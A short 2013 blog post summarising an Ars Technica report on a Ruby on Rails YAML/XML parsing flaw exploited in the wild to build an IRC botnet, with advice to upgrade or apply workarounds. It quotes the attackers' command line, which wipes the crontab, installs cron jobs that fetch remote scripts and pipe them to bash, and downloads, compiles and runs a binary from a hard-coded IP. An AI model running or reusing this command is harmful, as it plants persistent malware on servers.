---
layout: post
title:  "Ars Technica Article"
date:   2013-06-06 13:01:00
comments: true
categories: article
---

#### Critical Ruby on Rails bug exploited in wild, hacked servers join botnet

On May 28, 2013 an article on [Ars Technica][arstech] reported a malicious Rails bug that inflatrated any server running Rails 2.3.15 and lower. The attackers exploited a flaw in YAML and the rails Symbol type conversion XML parser. Attackers used hyjacked machines to create IRCbots to flood the #rails IRC channel.

Attackers used a unix command similar to this:
{% highlight bash %}
  crontab -r; echo \"1 * * * * wget -O - colkolduld.com/cmd1|bash;wget -O - lochjol.com/cmd2|bash;wget  -O - ddos.cat.com/cmd3|bash;\"|crontab -;wget http://88.198.20.247/k.c -O /tmp/k.c; gcc -o /tmp/k /tmp/k.c; chmod +x /tmp/k; /tmp/k||wget http://88.198.20.247/k -O /tmp/k && chmod +x /tmp/k && /tmp/k
{% endhighlight %}

Rails admins are advised to update to the latest version of Rails (4) or use [these][google] work arounds to avoid this vulnerability. 

[arstech]: http://arstechnica.com/security/2013/05/critical-ruby-on-rails-bug-exploited-in-wild-hacked-servers-join-botnet/
[google]: https://groups.google.com/forum/#!topic/rubyonrails-security/61bkgvnSGTQ/discussion
